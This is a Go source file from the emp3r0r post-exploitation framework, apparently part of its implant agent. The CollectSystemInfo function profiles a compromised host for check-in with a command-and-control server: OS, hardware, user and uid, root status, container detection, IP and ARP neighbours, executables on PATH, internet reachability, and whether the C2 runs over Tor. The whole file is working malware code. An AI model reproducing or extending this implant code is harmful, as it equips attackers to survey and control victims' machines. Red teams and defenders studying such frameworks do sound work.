package c2transport

import (
	"fmt"
	"log"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/jaypipes/ghw"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/sysinfo"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CollectSystemInfo build system info object
func CollectSystemInfo() *def.Emp3r0rAgent {
	log.Println("Collecting system info for checking in")
	var info def.Emp3r0rAgent
	osinfo := sysinfo.GetOSInfo()
	info.GOOS = runtime.GOOS

	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	// read productInfo
	info.Product, err = ghw.Product(ghw.WithDisableWarnings())
	if err != nil {
		log.Printf("ProductInfo: %v", err)
	}
	info.CWD, err = os.Getwd()
	if err != nil {
		log.Printf("Getwd: %v", err)
		info.CWD = "."
	}

	common.RuntimeConfig.AgentTag = util.GetHostID(info.Product, common.RuntimeConfig.AgentUUID)
	info.Tag = common.RuntimeConfig.AgentTag // use hostid
	info.Hostname = hostname
	info.Name = strings.Split(info.Tag, "-agent")[0]
	info.Version = def.Version
	info.Kernel = osinfo.Kernel
	info.Arch = osinfo.Architecture
	info.CPU = util.GetCPUInfo()
	info.GPU = util.GetGPUInfo()
	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
	info.Hardware = util.CheckProduct(info.Product)
	info.Container = sysinfo.CheckContainer()
	agentutils.SetC2Transport()
	info.Transport = def.Transport

	// have root?
	info.HasRoot = sysinfo.HasRoot()

	// process
	info.Process = CheckAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		log.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = transport.IsTor(def.CCAddress)

	// has internet?
	if common.RuntimeConfig.EnableNCSI {
		info.HasInternet = transport.TestConnectivity(transport.UbuntuConnectivityURL, common.RuntimeConfig.C2TransportProxy)
		info.NCSIEnabled = true
	} else {
		info.HasInternet = false
		info.NCSIEnabled = false
	}

	// IP address?
	info.IPs = transport.IPa()

	// arp -a ?
	info.ARP = transport.IPNeigh()

	// exes in PATH
	info.Exes = util.ScanPATH()

	return &info
}
